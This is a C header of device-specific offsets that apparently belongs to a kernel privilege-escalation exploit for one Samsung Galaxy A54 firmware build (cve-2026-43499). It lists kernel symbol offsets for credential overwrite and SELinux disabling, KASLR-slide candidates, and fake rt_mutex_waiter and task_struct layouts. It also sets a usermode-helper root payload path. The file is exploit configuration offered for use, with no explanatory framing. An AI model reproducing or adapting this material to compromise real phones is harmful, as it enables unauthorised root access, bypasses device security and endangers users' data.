#ifndef OFFSET_H
#define OFFSET_H

/* ---------------------------------------------------------------------------
 * Target identity & build flags
 * ------------------------------------------------------------------------- */
#define BUILD_VARIANT_LABEL "a54x-A546BXXSLFZG3-app"
#define PHYS_P0_ORACLE 1
#define SLIDE_ROUTE SLIDE_ROUTE_MCAST

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/a54xnaxx/a54x:16/BP4A.251205.006/A546BXXSLFZG3:user/release-keys"
#endif

/* --- kmalloc layout (mm_struct slab shape) -------------------------------- */
#ifndef MM_STRUCT_SZ
#define MM_STRUCT_SZ 0x400
#endif
#define KMALLOC_CGROUP_TYPE 1
#define KMALLOC_CACHE_TYPES 3

/* ---------------------------------------------------------------------------
 * Route / build tuning
 * ------------------------------------------------------------------------- */
#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 2
#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 2
#define FOPS_ROUTE_COARSE_DELAY_USEC 50000
#define FOPS_ROUTE_FINE_DELAY_TICKS \
  0ULL, 0x10ULL, 0x20ULL, 0x30ULL, 0x40ULL, 0x60ULL, 0x80ULL, 0x18ULL
#define PRODUCTION_STACK_PI_RIGHT_ONLY 1

#define DEFAULT_EXPLOIT_ATTEMPTS 8
#define DEFAULT_ATTEMPT_TIMEOUT_SEC 2200
#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 1200

/* ---------------------------------------------------------------------------
 * Kernel virtual address map
 * ------------------------------------------------------------------------- */
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#ifndef P0_PHYS_OFFSET
#define P0_PHYS_OFFSET 0x80000000ULL
#endif
#ifndef P0_KERNEL_PHYS_LOAD
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
#endif

#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

/* ---------------------------------------------------------------------------
 * P0 physical oracle (configfs gate/probe slots)
 * ------------------------------------------------------------------------- */
#define P0_ORACLE_GATE_SLOT 0
#define P0_ORACLE_PROBE_SLOT 1
#define P0_ORACLE_GATE_RESTORE_SLOT 2
#define P0_ORACLE_PROBE_RESTORE_SLOT 3
#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
#define P0_ORACLE_GATE_OBJECT_INDEX 1
#define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
#define P0_FINGERPRINT_HEADER \
  "targets/a54x-A546BXXSLFZG3/p0_fingerprint.h"

/* ---------------------------------------------------------------------------
 * KASLR slide (p0 offset candidates + tracefs worker)
 * ------------------------------------------------------------------------- */
#define SLIDE_P0_OFFSET_CANDIDATES \
  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, \
  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, \
  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, \
  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, \
  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, \
  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL
#define SLIDE_MAX_ATTEMPTS 32
#define SLIDE_KASLR_STEP 0x4000ULL
#define SLIDE_TRACEFS_EVENT_ID 108
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x0010825cULL

/* ---------------------------------------------------------------------------
 * Slide / requeue-PI mechanism
 * ------------------------------------------------------------------------- */
#define SLIDE_FAKE_WAITER_PRIO 0
#define SLIDE_WAIT_NSEC 2000000000L
#define SLIDE_REQUEUE_ARM_USEC 20000
#define SLIDE_USE_FAKE_TASK 1
#define COMPACT_RT_MUTEX_WAITER 1
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL

/* --- slide kernelsnitch tuning ------------------------------------------- */
#define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
#define SLIDE_KSNITCH_AVERAGE 8

/* --- controlled-mm bank layout ------------------------------------------- */
#define SLIDE_BANK_SLOTS 4
#define SLIDE_BANK_TASK_OFF 0x1000
#define SLIDE_BANK_TASK_STRIDE 0x1c0
#define SLIDE_BANK_LOCK_OFF 0x5200
#define SLIDE_BANK_SLOT_STRIDE 0x100
#define SLIDE_BANK_WAITER_OFF 0x40

/* ---------------------------------------------------------------------------
 * Collision / reclaim tuning (device-specific)
 * ------------------------------------------------------------------------- */
#define SKB_SEND_SIZE 0x8e80
#define SKB_RECLAIM_SENDS 64
#define SLIDE_RECLAIM_SENDS 64

/* ---------------------------------------------------------------------------
 * Root escalation (cred offsets + usermode-helper)
 * ------------------------------------------------------------------------- */
#define TASK_STRUCT_CRED_OFF      0x798ULL
#define TASK_STRUCT_REAL_CRED_OFF 0x790ULL
#define FAKE_TASK_TASK_GROUP_OFF  0x400ULL

#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

/* ---------------------------------------------------------------------------
 * Static kernel symbol offsets (text-relative)
 * ------------------------------------------------------------------------- */
/* --- global / root symbols ------------------------------------------------ */
#define INIT_TASK_OFF             0x0237fd80ULL
#define PREPARE_KERNEL_CRED_OFF   0x0011367cULL
#define COMMIT_CREDS_OFF          0x00112f24ULL
#define OVERRIDE_CREDS_OFF        0x0011330cULL
#define ROOT_TASK_GROUP_OFF       0x02571f40ULL
#define SELINUX_ENFORCING_OFF     0x026452a8ULL
#define KMALLOC_CACHES_OFF        0x01ae8ff0ULL
#define ANON_PIPE_BUF_OPS_OFF     0x018f71e0ULL
#define SYSTEM_UNBOUND_WQ_OFF     0x0236ae20ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x00100ae0ULL

/* --- ashmem / configfs / fops gadgets ------------------------------------- */
#define ASHMEM_FOPS_OFF           0x01a97df0ULL
#define ASHMEM_MISC_FOPS_OFF      0x024df810ULL
#define ASHMEM_IOCTL_OFF          0x00ce7170ULL
#define ASHMEM_COMPAT_IOCTL_OFF   0x00ce7728ULL
#define ASHMEM_MMAP_OFF           0x00ce7780ULL
#define ASHMEM_OPEN_OFF           0x00ce79bcULL
#define ASHMEM_RELEASE_OFF        0x00ce7a40ULL
#define ASHMEM_SHOW_FDINFO_OFF    0x00ce7b60ULL
#define CONFIGFS_READ_ITER_OFF    0x00475598ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00475a54ULL
#define COPY_SPLICE_READ_OFF      0x003fc730ULL
#define NOOP_LLSEEK_OFF           0x003b1918ULL

/* --- slide leak symbols ---------------------------------------------------- */
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x017deb18ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x023725a0ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x0249e7f8ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x0272a3c9ULL

/* ---------------------------------------------------------------------------
 * Derived image addresses (KIMAGE_TEXT_BASE + offset)
 * ------------------------------------------------------------------------- */
/* --- global / root symbols ------------------------------------------------ */
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)

/* --- ashmem / configfs / fops gadgets ------------------------------------- */
#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)

/* --- slide leak symbols ---------------------------------------------------- */
#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* ---------------------------------------------------------------------------
 * Payload page layout (controlled-mm scratch page)
 * ------------------------------------------------------------------------- */
#define LOCK_OFF 0x2210
#define W0_OFF 0x2350
#define FOPS_OFF 0x2000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

/* --- fake rt_mutex_waiter layout ------------------------------------------ */
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38
#define FAKE_WAITER_WAKE_STATE_OFF 0x40
#define FAKE_WAITER_PRIO_OFF 0x44
#define FAKE_WAITER_DEADLINE_OFF 0x48
#define FAKE_WAITER_WW_CTX_OFF 0x50

/* --- fake task_struct layout ---------------------------------------------- */
#define FAKE_TASK_USAGE_OFF 0x38
#define FAKE_TASK_PRIO_OFF 0x7c
#define FAKE_TASK_NORMAL_PRIO_OFF 0x84
#define FAKE_TASK_PI_LOCK_OFF 0x884
#define FAKE_TASK_PI_WAITERS_OFF 0x898
#define FAKE_TASK_PI_TOP_TASK_OFF 0x8a8
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8b0

/* ---------------------------------------------------------------------------
 * configfs (configfs_bin_buffer) struct layout
 * ------------------------------------------------------------------------- */
#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF 100

/* ---------------------------------------------------------------------------
 * workqueue / worker-pool layout
 * ------------------------------------------------------------------------- */
#define WQ_DFL_PWQ_OFF 0xb0
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF 0x20
#define POOL_NR_IDLE_OFF 0x34

/* --- work_struct layout ---------------------------------------------------- */
#define WORK_DATA_OFF 0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18

/* ---------------------------------------------------------------------------
 * struct page layout
 * ------------------------------------------------------------------------- */
#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x18
#define STRUCT_PAGE_TYPE_OFF 0x30

/* ---------------------------------------------------------------------------
 * pipe buffer
 * ------------------------------------------------------------------------- */
#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

/* ---------------------------------------------------------------------------
 * file_operations struct layout
 * ------------------------------------------------------------------------- */
#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF 0x60
#define FOPS_OPEN_OFF 0x70
#define FOPS_RELEASE_OFF 0x80
#define FOPS_SPLICE_READ_OFF 0xc8
#define FOPS_SHOW_FDINFO_OFF 0xe0
#endif
